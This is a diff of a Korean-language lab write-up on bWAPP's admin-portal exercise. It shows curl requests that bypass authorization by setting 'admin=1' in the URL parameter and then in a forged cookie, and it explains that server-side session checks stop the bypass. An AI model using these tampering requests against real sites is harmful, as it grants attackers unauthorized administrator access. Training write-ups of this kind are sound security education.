@@ -42,21 +42,21 @@
         (권한 부족으로 'This page is locked.' 메시지 출력)
         │
         ▼
-[2단계] 서버 요청 구조 분석 (파라미터 확인)
-        (URL에 포함된 '?admin=0' 매개변수 식별)
-        │
-        ▼
-[3단계] 파라미터 값 변조 및 서버 재요청 (권한 탈취)
+[2단계] [Level 0] 서버 요청 구조 분석 및 URL 변조
         ('?admin=0' 을 '?admin=1' 로 조작하여 인증 우회)
         │
         ▼
-[4단계] 관리자 권한 도메인(페이지) 접근 성공 확인
-        ('Cowabunga... You unlocked this page' 출력 확인)
+[3단계] [Level 1] 쿠키 파라미터 분석 및 쿠키 변조
+        (Cookie에 'admin=1' 주입하여 인증 우회)
+        │
+        ▼
+[4단계] [Level 2] 세션 기반 검증(방어 기법) 동작 확인
+        (서버 메모리의 $_SESSION 값을 사용하여 클라이언트 조작 방어)
 ```
 
 ---
 
-## 🛠️ 단계별 실습 (실제 실행 명령어)
+## 🛠️ 단계별 실습 (보안 레벨에 따른 우회 및 방어)
 
 ### Step 1: 기본 권한 상태 확인 (접근 거부)
 
@@ -79,15 +79,14 @@ curl -s \
 
 ---
 
-### Step 2: URL 쿼리 파라미터(Parameter) 변조 투입
+### Step 2: Security Level 0 (Low) - 권한 우회 (URL 파라미터 조작)
 
-URL의 쿼리 스트링(Query String)에 노출된 `admin=0` 값을 서버관리자(admin=1)를 뜻할 것으로 유추하여 `admin=1`로 변조 후 전송합니다.
+보안 레벨이 낮을 때(Level 0), `$_GET["admin"]` 인자만으로 권한을 체크하는 허점을 이용합니다.
 
 ```bash
 # 악의적인 파라미터 조작(admin=1)으로 요청 전송
 curl -s \
      -b /home/kali/docker_exam/bwapp_cookie.txt \
-     -c /home/kali/docker_exam/bwapp_cookie.txt \
      "http://192.168.0.20/bWAPP/smgmt_admin_portal.php?admin=1" | grep -i "Cowabunga"
 ```
 
@@ -96,17 +95,43 @@ curl -s \
 <p>Cowabunga...<p><font color="green">You unlocked this page using an URL manipulation.</font></p></p>
 ```
 
-> 🚨 **취약점 작동 확인**: 일반 `bee` 계정 쿠키를 사용했음에도 오직 URL 파라미터를 넘긴 것만으로 서버 백엔드가 이를 관리자로 신뢰하고 `Unlocked` 화면(관리 기능 표출)을 노출하였습니다.
+---
+
+### Step 3: Security Level 1 (Medium) - 권한 우회 (쿠키 조작)
+
+보안 레벨이 중간일 때(Level 1), URL 파라미터를 보지 않는 대신 **쿠키(Cookie)**에 담긴 `$_COOKIE["admin"]` 값을 검증합니다. 공격자는 헤더에 담기는 쿠키 역시 손쉽게 위조할 수 있습니다.
+
+```bash
+# 쿠키 내에 인증 변수(admin=1)를 강제로 주입하여 요청
+curl -s \
+     -b "admin=1; security_level=1; PHPSESSID=..." \
+     "http://192.168.0.20/bWAPP/smgmt_admin_portal.php" | grep -i "Cowabunga"
+```
+
+**실행 결과:**
+```html
+<p>Cowabunga...<p><font color="green">You unlocked this page using a cookie manipulation.</font></p></p>
+```
+
+> 🚨 **취약점 작동 확인**: 보이지 않는 HTTP 헤더 (쿠키) 영역조차도 사용자가 완벽히 통제할 수 있으므로, 권한 인가 처리를 클라이언트에게 맡기면 필연적으로 우회됩니다.
+
+---
+
+### Step 4: Security Level 2 (High) - 방어 메커니즘 (Server-Side Session 검증)
+
+최고 보안 레벨(Level 2)에서는 클라이언트가 전송하는 URL 파라미터나 쿠키를 일절 신뢰하지 않습니다. 대신 **서버 측 메모리에 할당된 세션 변수**(`$_SESSION["admin"]`)를 대조합니다.
+
+> "Cowabunga..." 메시지와 함께 "contact your dba..." 힌트가 출력되며 접근이 차단됩니다. 클라이언트에서 임의로 세션 값을 조작하는 것은 불가능하기에 해당 취약점은 성립하지 않으며, **오직 DB 내 권한 계정(admin column)이 직접 변경되어야만** 정상 인가 처리가 이뤄집니다.
 
 ---
 
 ## 📊 공격 결과 요약
 
-| 정보 유형 | 내용 |
+| 보안 적용 기준 | 내용 |
 |-----------|------------------|
-| **조작 방식** | URL 파라미터 변조 단계 우회 (`admin=0` -> `admin=1`) |
-| **취약점 영향** | 일반 사용자 인증만된 상태에서 **최고 관리자 권한 획득(수직적 권한 상승)** |
-| **잠재적 위험** | 공격자가 실제 사이트의 백오피스(Back-Office) 및 관리자 페이지에 접근하여 서비스 전체 통제, 유저 DB 무단 수정 및 삭제 등이 가능해집니다. |
+| **Level 0 (Low)** | URL 파라미터 변조 단계 우회 (`admin=0` -> `admin=1`)를 통해 최고 권한 획득 |
+| **Level 1 (Medium)** | HTTP 요청 시 쿠키 변조 값 반입 (`Cookie: admin=1`)을 통한 최고 권한 획득 |
+| **Level 2 (High)** | 서버 세션(Session) 기반 로직이 적용되어 사실상 **클라이언트 측 권한 우회 공격 원천 차단** |
 
 ---
 
